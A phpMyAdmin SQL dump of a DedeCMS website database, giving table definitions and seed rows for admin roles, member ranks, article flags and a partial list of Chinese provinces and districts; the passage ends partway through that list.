-- phpMyAdmin SQL Dump
-- version 3.4.5
-- http://www.phpmyadmin.net
--
-- 主机: localhost
-- 生成日期: 2012 年 05 月 05 日 10:41
-- 服务器版本: 5.5.16
-- PHP 版本: 5.3.8

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- 数据库: `dedecms`
--

-- --------------------------------------------------------

--
-- 表的结构 `dede_addonarticle`
--

CREATE TABLE IF NOT EXISTS `dede_addonarticle` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_addonimages`
--

CREATE TABLE IF NOT EXISTS `dede_addonimages` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pagestyle` smallint(6) NOT NULL DEFAULT '1',
  `maxwidth` smallint(6) NOT NULL DEFAULT '600',
  `imgurls` text,
  `row` smallint(6) NOT NULL DEFAULT '0',
  `col` smallint(6) NOT NULL DEFAULT '0',
  `isrm` smallint(6) NOT NULL DEFAULT '0',
  `ddmaxwidth` smallint(6) NOT NULL DEFAULT '200',
  `pagepicnum` smallint(6) NOT NULL DEFAULT '12',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `body` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `imagesMain` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_addoninfos`
--

CREATE TABLE IF NOT EXISTS `dede_addoninfos` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `channel` smallint(6) NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `click` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(60) NOT NULL DEFAULT '',
  `userip` varchar(15) NOT NULL DEFAULT ' ',
  `senddate` int(11) NOT NULL DEFAULT '0',
  `flag` set('c','h','p','f','s','j','a','b') DEFAULT NULL,
  `lastpost` int(10) unsigned NOT NULL DEFAULT '0',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `goodpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `badpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `nativeplace` smallint(5) unsigned NOT NULL DEFAULT '0',
  `infotype` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `endtime` int(11) NOT NULL DEFAULT '0',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `address` varchar(100) NOT NULL DEFAULT '',
  `linkman` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`,`nativeplace`,`infotype`),
  KEY `channel` (`channel`,`arcrank`,`mid`,`click`,`title`,`litpic`,`senddate`,`flag`,`endtime`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_addonshop`
--

CREATE TABLE IF NOT EXISTS `dede_addonshop` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `price` float NOT NULL DEFAULT '0',
  `trueprice` float NOT NULL DEFAULT '0',
  `brand` varchar(250) NOT NULL DEFAULT '',
  `units` varchar(250) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL,
  `userip` char(15) NOT NULL,
  `redirecturl` varchar(255) NOT NULL,
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_addonsoft`
--

CREATE TABLE IF NOT EXISTS `dede_addonsoft` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `filetype` varchar(10) NOT NULL DEFAULT '',
  `language` varchar(10) NOT NULL DEFAULT '',
  `softtype` varchar(10) NOT NULL DEFAULT '',
  `accredit` varchar(10) NOT NULL DEFAULT '',
  `os` varchar(30) NOT NULL DEFAULT '',
  `softrank` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `officialUrl` varchar(30) NOT NULL DEFAULT '',
  `officialDemo` varchar(50) NOT NULL DEFAULT '',
  `softsize` varchar(10) NOT NULL DEFAULT '',
  `softlinks` text,
  `introduce` text,
  `daccess` smallint(5) NOT NULL DEFAULT '0',
  `needmoney` smallint(5) NOT NULL DEFAULT '0',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `softMain` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_addonspec`
--

CREATE TABLE IF NOT EXISTS `dede_addonspec` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `note` text,
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_admin`
--

CREATE TABLE IF NOT EXISTS `dede_admin` (
  `id` int(10) unsigned NOT NULL,
  `usertype` float unsigned DEFAULT '0',
  `userid` char(30) NOT NULL DEFAULT '',
  `pwd` char(32) NOT NULL DEFAULT '',
  `uname` char(20) NOT NULL DEFAULT '',
  `tname` char(30) NOT NULL DEFAULT '',
  `email` char(30) NOT NULL DEFAULT '',
  `typeid` text,
  `logintime` int(10) unsigned NOT NULL DEFAULT '0',
  `loginip` varchar(20) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_admin`
--

INSERT INTO `dede_admin` (`id`, `usertype`, `userid`, `pwd`, `uname`, `tname`, `email`, `typeid`, `logintime`, `loginip`) VALUES
(1, 10, 'admin', 'f297a57a5a743894a0e4', 'admin', '', '', '0', 1334461735, '127.0.0.1');

-- --------------------------------------------------------

--
-- 表的结构 `dede_admintype`
--

CREATE TABLE IF NOT EXISTS `dede_admintype` (
  `rank` float NOT NULL DEFAULT '1',
  `typename` varchar(30) NOT NULL DEFAULT '',
  `system` smallint(6) NOT NULL DEFAULT '0',
  `purviews` text,
  PRIMARY KEY (`rank`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_admintype`
--

INSERT INTO `dede_admintype` (`rank`, `typename`, `system`, `purviews`) VALUES
(1, '信息发布员', 1, 't_AccList a_AccNew a_AccList a_MyList a_MyEdit a_MyDel sys_MdPwd sys_Feedback sys_MyUpload plus_留言簿模块 '),
(5, '频道管理员', 1, 't_AccList t_AccNew t_AccEdit t_AccDel a_AccNew a_AccList a_AccEdit a_AccDel a_AccCheck a_MyList a_MyEdit a_MyDel a_MyCheck co_AddNote co_EditNote co_PlayNote co_ListNote co_ViewNote spec_New spec_List spec_Edit sys_MdPwd sys_Log sys_ArcTj sys_Source sys_Writer sys_Keyword sys_MakeHtml sys_Feedback sys_Upload sys_MyUpload member_List member_Edit plus_站内新闻发布 plus_友情链接模块 plus_留言簿模块 plus_投票模块 plus_广告管理 '),
(10, '超级管理员', 1, 'admin_AllowAll ');

-- --------------------------------------------------------

--
-- 表的结构 `dede_advancedsearch`
--

CREATE TABLE IF NOT EXISTS `dede_advancedsearch` (
  `mid` int(11) NOT NULL,
  `maintable` varchar(256) NOT NULL DEFAULT '',
  `mainfields` text,
  `addontable` varchar(256) DEFAULT '',
  `addonfields` text,
  `forms` text,
  `template` varchar(256) NOT NULL DEFAULT '',
  UNIQUE KEY `mid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_arcatt`
--

CREATE TABLE IF NOT EXISTS `dede_arcatt` (
  `sortid` smallint(6) NOT NULL DEFAULT '0',
  `att` char(10) NOT NULL DEFAULT '',
  `attname` char(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`att`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

--
-- 转存表中的数据 `dede_arcatt`
--

INSERT INTO `dede_arcatt` (`sortid`, `att`, `attname`) VALUES
(5, 's', '滚动'),
(1, 'h', '头条'),
(3, 'f', '幻灯'),
(2, 'c', '推荐'),
(7, 'p', '图片'),
(8, 'j', '跳转'),
(4, 'a', '特荐'),
(6, 'b', '加粗');

-- --------------------------------------------------------

--
-- 表的结构 `dede_arccache`
--

CREATE TABLE IF NOT EXISTS `dede_arccache` (
  `md5hash` char(32) NOT NULL DEFAULT '',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `cachedata` mediumtext,
  PRIMARY KEY (`md5hash`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_archives`
--

CREATE TABLE IF NOT EXISTS `dede_archives` (
  `id` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid2` varchar(90) NOT NULL DEFAULT '0',
  `sortrank` int(10) unsigned NOT NULL DEFAULT '0',
  `flag` set('c','h','p','f','s','j','a','b') DEFAULT NULL,
  `ismake` smallint(6) NOT NULL DEFAULT '0',
  `channel` smallint(6) NOT NULL DEFAULT '1',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `click` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `money` smallint(6) NOT NULL DEFAULT '0',
  `title` char(60) NOT NULL DEFAULT '',
  `shorttitle` char(36) NOT NULL DEFAULT '',
  `color` char(7) NOT NULL DEFAULT '',
  `writer` char(20) NOT NULL DEFAULT '',
  `source` char(30) NOT NULL DEFAULT '',
  `litpic` char(100) NOT NULL DEFAULT '',
  `pubdate` int(10) unsigned NOT NULL DEFAULT '0',
  `senddate` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `keywords` char(30) NOT NULL DEFAULT '',
  `lastpost` int(10) unsigned NOT NULL DEFAULT '0',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `goodpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `badpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `notpost` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `description` varchar(255) NOT NULL DEFAULT '',
  `filename` varchar(40) NOT NULL DEFAULT '',
  `dutyadmin` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `tackid` int(10) NOT NULL DEFAULT '0',
  `mtype` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `weight` int(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`),
  KEY `mainindex` (`arcrank`,`typeid`,`channel`,`flag`,`mid`),
  KEY `lastpost` (`lastpost`,`scores`,`goodpost`,`badpost`,`notpost`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk;

-- --------------------------------------------------------

--
-- 表的结构 `dede_arcmulti`
--

CREATE TABLE IF NOT EXISTS `dede_arcmulti` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `tagid` char(60) NOT NULL DEFAULT '',
  `uptime` int(11) NOT NULL DEFAULT '0',
  `innertext` varchar(255) NOT NULL DEFAULT '',
  `pagesize` int(11) NOT NULL DEFAULT '0',
  `arcids` text NOT NULL,
  `ordersql` varchar(255) DEFAULT '',
  `addfieldsSql` varchar(255) DEFAULT '',
  `addfieldsSqlJoin` varchar(255) DEFAULT '',
  `attstr` text,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_arcrank`
--

CREATE TABLE IF NOT EXISTS `dede_arcrank` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `rank` smallint(6) NOT NULL DEFAULT '0',
  `membername` char(20) NOT NULL DEFAULT '',
  `adminrank` smallint(6) NOT NULL DEFAULT '0',
  `money` smallint(8) unsigned NOT NULL DEFAULT '500',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `purviews` mediumtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=6 ;

--
-- 转存表中的数据 `dede_arcrank`
--

INSERT INTO `dede_arcrank` (`id`, `rank`, `membername`, `adminrank`, `money`, `scores`, `purviews`) VALUES
(1, 0, '开放浏览', 5, 0, 0, ''),
(2, -1, '待审核稿件', 0, 0, 0, ''),
(3, 10, '注册会员', 5, 0, 100, ''),
(4, 50, '中级会员', 5, 300, 200, ''),
(5, 100, '高级会员', 5, 800, 500, '');

-- --------------------------------------------------------

--
-- 表的结构 `dede_arctiny`
--

CREATE TABLE IF NOT EXISTS `dede_arctiny` (
  `id` mediumint(8) unsigned NOT NULL AUTO_INCREMENT,
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `typeid2` varchar(90) NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `channel` smallint(5) NOT NULL DEFAULT '1',
  `senddate` int(10) unsigned NOT NULL DEFAULT '0',
  `sortrank` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  KEY `sortrank` (`sortrank`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_arctype`
--

CREATE TABLE IF NOT EXISTS `dede_arctype` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `reid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `topid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `sortrank` smallint(5) unsigned NOT NULL DEFAULT '50',
  `typename` char(30) NOT NULL DEFAULT '',
  `typedir` char(60) NOT NULL DEFAULT '',
  `isdefault` smallint(6) NOT NULL DEFAULT '0',
  `defaultname` char(15) NOT NULL DEFAULT 'index.html',
  `issend` smallint(6) NOT NULL DEFAULT '0',
  `channeltype` smallint(6) DEFAULT '1',
  `maxpage` smallint(6) NOT NULL DEFAULT '-1',
  `ispart` smallint(6) NOT NULL DEFAULT '0',
  `corank` smallint(6) NOT NULL DEFAULT '0',
  `tempindex` char(50) NOT NULL DEFAULT '',
  `templist` char(50) NOT NULL DEFAULT '',
  `temparticle` char(50) NOT NULL DEFAULT '',
  `namerule` char(50) NOT NULL DEFAULT '',
  `namerule2` char(50) NOT NULL DEFAULT '',
  `modname` char(20) NOT NULL DEFAULT '',
  `description` char(150) NOT NULL DEFAULT '',
  `keywords` varchar(60) NOT NULL DEFAULT '',
  `seotitle` varchar(80) NOT NULL DEFAULT '',
  `moresite` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `sitepath` char(60) NOT NULL DEFAULT '',
  `siteurl` char(50) NOT NULL DEFAULT '',
  `ishidden` smallint(6) NOT NULL DEFAULT '0',
  `cross` tinyint(1) NOT NULL DEFAULT '0',
  `crossid` text,
  `content` text,
  `smalltypes` text,
  PRIMARY KEY (`id`),
  KEY `reid` (`reid`,`isdefault`,`channeltype`,`ispart`,`corank`,`topid`,`ishidden`),
  KEY `sortrank` (`sortrank`)
) ENGINE=MyISAM DEFAULT CHARSET=gbk AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- 表的结构 `dede_area`
--

CREATE TABLE IF NOT EXISTS `dede_area` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(20) NOT NULL DEFAULT '',
  `reid` int(10) unsigned NOT NULL DEFAULT '0',
  `disorder` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=gbk AUTO_INCREMENT=3118 ;

--
-- 转存表中的数据 `dede_area`
--

INSERT INTO `dede_area` (`id`, `name`, `reid`, `disorder`) VALUES
(1, '北京市', 0, 0),
(102, '西城区', 1, 2),
(126, '崇文区', 1, 0),
(104, '宣武区', 1, 0),
(105, '朝阳区', 1, 0),
(106, '海淀区', 1, 0),
(107, '丰台区', 1, 0),
(108, '石景山区', 1, 0),
(109, '门头沟区', 1, 0),
(110, '房山区', 1, 0),
(111, '通州区', 1, 0),
(112, '顺义区', 1, 0),
(113, '昌平区', 1, 0),
(114, '大兴区', 1, 0),
(115, '平谷县', 1, 0),
(116, '怀柔县', 1, 0),
(117, '密云县', 1, 0),
(118, '延庆县', 1, 0),
(2, '上海市', 0, 0),
(201, '黄浦区', 2, 0),
(202, '卢湾区', 2, 0),
(203, '徐汇区', 2, 0),
(204, '长宁区', 2, 0),
(205, '静安区', 2, 0),
(206, '普陀区', 2, 0),
(207, '闸北区', 2, 0),
(208, '虹口区', 2, 0),
(209, '杨浦区', 2, 0),
(210, '宝山区', 2, 0),
(211, '闵行区', 2, 0),
(212, '嘉定区', 2, 0),
(213, '浦东新区', 2, 0),
(214, '松江区', 2, 0),
(215, '金山区', 2, 0),
(216, '青浦区', 2, 0),
(217, '南汇区', 2, 0),
(218, '奉贤区', 2, 0),
(219, '崇明县', 2, 0),
(3, '天津市', 0, 0),
(301, '和平区', 3, 0),
(302, '河东区', 3, 0),
(303, '河西区', 3, 0),
(304, '南开区', 3, 0),
(305, '河北区', 3, 0),
(306, '红桥区', 3, 0),
(307, '塘沽区', 3, 0),
(308, '汉沽区', 3, 0),
(309, '大港区', 3, 0),
(310, '东丽区', 3, 0),
(311, '西青区', 3, 0),
(312, '北辰区', 3, 0),
(313, '津南区', 3, 0),
(314, '武清区', 3, 0),
(315, '宝坻区', 3, 0),
(316, '静海县', 3, 0),
(317, '宁河县', 3, 0),
(318, '蓟县', 3, 0),
(4, '重庆市', 0, 0),
(401, '渝中区', 4, 0),
(402, '大渡口区', 4, 0),
(403, '江北区', 4, 0),
(404, '沙坪坝区', 4, 0),
(405, '九龙坡区', 4, 0),
(406, '南岸区', 4, 0),
(407, '北碚区', 4, 0),
(408, '万盛区', 4, 0),
(409, '双桥区', 4, 0),
(410, '渝北区', 4, 0),
(411, '巴南区', 4, 0),
(412, '万州区', 4, 0),
(413, '涪陵区', 4, 0),
(414, '黔江区', 4, 0),
(415, '永川市', 4, 0),
(416, '合川市', 4, 0),
(417, '江津市', 4, 0),
(418, '南川市', 4, 0),
(419, '长寿县', 4, 0),
(420, '綦江县', 4, 0),
(421, '潼南县', 4, 0),
(422, '荣昌县', 4, 0),
(423, '璧山县', 4, 0),
(424, '大足县', 4, 0),
(425, '铜梁县', 4, 0),
(426, '梁平县', 4, 0),
(427, '城口县', 4, 0),
(428, '垫江县', 4, 0),
(429, '武隆县', 4, 0),
(430, '丰都县', 4, 0),
(431, '奉节县', 4, 0),
(432, '开县', 4, 0),
(433, '云阳县', 4, 0),
(434, '忠县', 4, 0),
(435, '巫溪县', 4, 0),
(436, '巫山县', 4, 0),
(437, '石柱县', 4, 0),
(438, '秀山县', 4, 0),
(439, '酉阳县', 4, 0),
(440, '彭水县', 4, 0),
(5, '广东省', 0, 0),
(501, '广州市', 5, 0),
(502, '深圳市', 5, 0),
(503, '珠海市', 5, 0),
(504, '汕头市', 5, 0),
(505, '韶关市', 5, 0),
(506, '河源市', 5, 0),
(507, '梅州市', 5, 0),
(508, '惠州市', 5, 0),
(509, '汕尾市', 5, 0),
(510, '东莞市', 5, 0),
(511, '中山市', 5, 0),
(512, '江门市', 5, 0),
(513, '佛山市', 5, 0),
(514, '阳江市', 5, 0),
(515, '湛江市', 5, 0),
(516, '茂名市', 5, 0),
(517, '肇庆市', 5, 0),
(518, '清远市', 5, 0),
(519, '潮州市', 5, 0),
(520, '揭阳市', 5, 0),
(521, '云浮市', 5, 0),
(6, '福建省', 0, 0),
(601, '福州市', 6, 0),
(602, '厦门市', 6, 0),
(603, '三明市', 6, 0),
(604, '莆田市', 6, 0),
(605, '泉州市', 6, 0),
(606, '漳州市', 6, 0),
(607, '南平市', 6, 0),
(608, '龙岩市', 6, 0),
(609, '宁德市', 6, 0),
(7, '浙江省', 0, 0),
(701, '杭州市', 7, 0),
(702, '宁波市', 7, 0),
(703, '温州市', 7, 0),
(704, '嘉兴市', 7, 0),
(705, '湖州市', 7, 0),
(706, '绍兴市', 7, 0),
(707, '金华市', 7, 0),
(708, '衢州市', 7, 0),
(709, '舟山市', 7, 0),
(710, '台州市', 7, 0),
(711, '丽水市', 7, 0),
(8, '江苏省', 0, 0),
(801, '南京市', 8, 0),
(802, '徐州市', 8, 0),
(803, '连云港市', 8, 0),
(804, '淮安市', 8, 0),
(805, '宿迁市', 8, 0),
(806, '盐城市', 8, 0),
(807, '扬州市', 8, 0),
(808, '泰州市', 8, 0),
(809, '南通市', 8, 0),
(810, '镇江市', 8, 0),
(811, '常州市', 8, 0),
(812, '无锡市', 8, 0),
(813, '苏州市', 8, 0),
(9, '山东省', 0, 0),
(901, '济南市', 9, 0),
(902, '青岛市', 9, 0),
(903, '淄博市', 9, 0),
(904, '枣庄市', 9, 0),
(905, '东营市', 9, 0),
(906, '潍坊市', 9, 0),
(907, '烟台市', 9, 0),
(908, '威海市', 9, 0),
(909, '济宁市', 9, 0),
(910, '泰安市', 9, 0),
(911, '日照市', 9, 0),
(912, '莱芜市', 9, 0),
(913, '德州市', 9, 0),
(914, '临沂市', 9, 0),
(915, '聊城市', 9, 0),
(916, '滨州市', 9, 0),
(917, '菏泽市', 9, 0),
(10, '辽宁省', 0, 0),
(1001, '沈阳市', 10, 0),
(1002, '大连市', 10, 0),
(1003, '鞍山市', 10, 0),
(1004, '抚顺市', 10, 0),
(1005, '本溪市', 10, 0),
(1006, '丹东市', 10, 0),
(1007, '锦州市', 10, 0),
(1008, '葫芦岛市', 10, 0),
(1009, '营口市', 10, 0),
(1010, '盘锦市', 10, 0),
(1011, '阜新市', 10, 0),
(1012, '辽阳市', 10, 0),
(1013, '铁岭市', 10, 0),
(1014, '朝阳市', 10, 0),
(11, '江西省', 0, 0),
(1101, '南昌市', 11, 0),
(1102, '景德镇市', 11, 0),
(1103, '萍乡市', 11, 0),
(1104, '新余市', 11, 0),
(1105, '九江市', 11, 0),
(1106, '鹰潭市', 11, 0),
(1107, '赣州市', 11, 0),
(1108, '吉安市', 11, 0),
(1109, '宜春市', 11, 0),
(1110, '抚州市', 11, 0),
(1111, '上饶市', 11, 0),
(12, '四川省', 0, 0),
(1201, '成都市', 12, 0),
(1202, '自贡市', 12, 0),
(1203, '攀枝花市', 12, 0),
(1204, '泸州市', 12, 0),
(1205, '德阳市', 12, 0),
(1206, '绵阳市', 12, 0),
(1207, '广元市', 12, 0),
(1208, '遂宁市', 12, 0),
(1209, '内江市', 12, 0),
(1210, '乐山市', 12, 0),
(1211, '南充市', 12, 0),
(1212, '宜宾市', 12, 0),
(1213, '广安市', 12, 0),
(1214, '达州市', 12, 0),
(1215, '巴中市', 12, 0),
(1216, '雅安市', 12, 0),
(1217, '眉山市', 12, 0),
(1218, '资阳市', 12, 0),
(1219, '阿坝州', 12, 0),
(1220, '甘孜州', 12, 0),
(1221, '凉山州', 12, 0),
(13, '陕西省', 0, 0),
(3114, '西安市', 13, 0),
(1302, '铜川市', 13, 0),
(1303, '宝鸡市', 13, 0),
(1304, '咸阳市', 13, 0),
(1305, '渭南市', 13, 0),
(1306, '延安市', 13, 0),
(1307, '汉中市', 13, 0),
(1308, '榆林市', 13, 0),
(1309, '安康市', 13, 0),
(1310, '商洛地区', 13, 0),
(14, '湖北省', 0, 0),
(1401, '武汉市', 14, 0),
(1402, '黄石市', 14, 0),
(1403, '襄樊市', 14, 0),
(1404, '十堰市', 14, 0),
(1405, '荆州市', 14, 0),
(1406, '宜昌市', 14, 0),
(1407, '荆门市', 14, 0),
(1408, '鄂州市', 14, 0),
(1409, '孝感市', 14, 0),
(1410, '黄冈市', 14, 0),
(1411, '咸宁市', 14, 0),
(1412, '随州市', 14, 0),
(1413, '仙桃市', 14, 0),
(1414, '天门市', 14, 0),
(1415, '潜江市', 14, 0),
(1416, '神农架', 14, 0),
(1417, '恩施州', 14, 0),
(15, '河南省', 0, 0),
(1501, '郑州市', 15, 0),
(1502, '开封市', 15, 0),
(1503, '洛阳市', 15, 0),
(1504, '平顶山市', 15, 0),
(1505, '焦作市', 15, 0),
(1506, '鹤壁市', 15, 0),
(1507, '新乡市', 15, 0),
(1508, '安阳市', 15, 0),
(1509, '濮阳市', 15, 0),
(1510, '许昌市', 15, 0),
(1511, '漯河市', 15, 0),
(1512, '三门峡市', 15, 0),
(1513, '南阳市', 15, 0),
(1514, '商丘市', 15, 0),
(1515, '信阳市', 15, 0),
(1516, '周口市', 15, 0),
(1517, '驻马店市', 15, 0),
(1518, '济源市', 15, 0),
(16, '河北省', 0, 0),
(1601, '石家庄市', 16, 0),
(1602, '唐山市', 16, 0),
(1603, '秦皇岛市', 16, 0),
(1604, '邯郸市', 16, 0),
(1605, '邢台市', 16, 0),
(1606, '保定市', 16, 0),
(1607, '张家口市', 16, 0),
(1608, '承德市', 16, 0),
(1609, '沧州市', 16, 0),
(1610, '廊坊市', 16, 0),
(1611, '衡水市', 16, 0),
(17, '山西省', 0, 0),
(1701, '太原市', 17, 0),
(1702, '大同市', 17, 0),
(1703, '阳泉市', 17, 0),
(1704, '长治市', 17, 0),
(1705, '晋城市', 17, 0),
(1706, '朔州市', 17, 0),
(1707, '晋中市', 17, 0),
(1708, '忻州市', 17, 0),
(1709, '临汾市', 17, 0),
(1710, '运城市', 17, 0),
(1711, '吕梁地区', 17, 0),
(18, '内蒙古', 0, 0),
(1801, '呼和浩特', 18, 0),
(1802, '包头市', 18, 0),
(1803, '乌海市', 18, 0),
(1804, '赤峰市', 18, 0),
(1805, '通辽市', 18, 0),
(1806, '鄂尔多斯', 18, 0),
(1807, '乌兰察布', 18, 0),
(1808, '锡林郭勒', 18, 0),
(1809, '呼伦贝尔', 18, 0),
(1810, '巴彦淖尔', 18, 0),
(1811, '阿拉善盟', 18, 0),
(1812, '兴安盟', 18, 0),
(19, '吉林省', 0, 0),
(1901, '长春市', 19, 0),
(1902, '吉林市', 19, 0),
(1903, '四平市', 19, 0),
(1904, '辽源市', 19, 0),
(1905, '通化市', 19, 0),
(1906, '白山市', 19, 0),
(1907, '松原市', 19, 0),
(1908, '白城市', 19, 0),
(1909, '延边州', 19, 0),
(20, '黑龙江', 0, 0),
(2001, '哈尔滨市', 20, 0),
(2002, '齐齐哈尔', 20, 0),
(2003, '鹤岗市', 20, 0),
(2004, '双鸭山市', 20, 0),
(2005, '鸡西市', 20, 0),
(2006, '大庆市', 20, 0),
(2007, '伊春市', 20, 0),
(2008, '牡丹江市', 20, 0),
(2009, '佳木斯市', 20, 0),
(2010, '七台河市', 20, 0),
(2011, '黑河市', 20, 0),
(2012, '绥化市', 20, 0),
(2013, '大兴安岭', 20, 0),
(21, '安徽省', 0, 0),
(2101, '合肥市', 21, 0),
(2102, '芜湖市', 21, 0),
(2103, '蚌埠市', 21, 0),
(2104, '淮南市', 21, 0),
(2105, '马鞍山市', 21, 0),
(2106, '淮北市', 21, 0),
(2107, '铜陵市', 21, 0),
(2108, '安庆市', 21, 0),
(2109, '黄山市', 21, 0),
(2110, '滁州市', 21, 0),
(2111, '阜阳市', 21, 0),
(2112, '宿州市', 21, 0),
(2113, '巢湖市', 21, 0),
(2114, '六安市', 21, 0),
(2115, '亳州市', 21, 0),
(2116, '宣城市', 21, 0),
(2117, '池州市', 21, 0),
(22, '湖南省', 0, 0),
(2201, '长沙市', 22, 0),
(2202, '株州市', 22, 0),
(2203, '湘潭市', 22, 0),
(2204, '衡阳市', 22, 0),
(2205, '邵阳市', 22, 0),
(2206, '岳阳市', 22, 0),
(2207, '常德市', 22, 0),
(2208, '张家界市', 22, 0),
(2209, '益阳市', 22, 0),
(2210, '郴州市', 22, 0),
(2211, '永州市', 22, 0),
(2212, '怀化市', 22, 0),
(2213, '娄底市', 22, 0),
(2214, '湘西州', 22, 0),
(23, '广西区', 0, 0),
(2301, '南宁市', 23, 0),
(2302, '柳州市', 23, 0),
(2303, '桂林市', 23, 0),
(2304, '梧州市', 23, 0),
(2305, '北海市', 23, 0),
(2306, '防城港市', 23, 0),
(2307, '钦州市', 23, 0),
(2308, '贵港市', 23, 0),
(2309, '玉林市', 23, 0),
(2310, '南宁地区', 23, 0),
(2311, '柳州地区', 23, 0),
(2312, '贺州地区', 23, 0),
(2313, '百色地区', 23, 0),
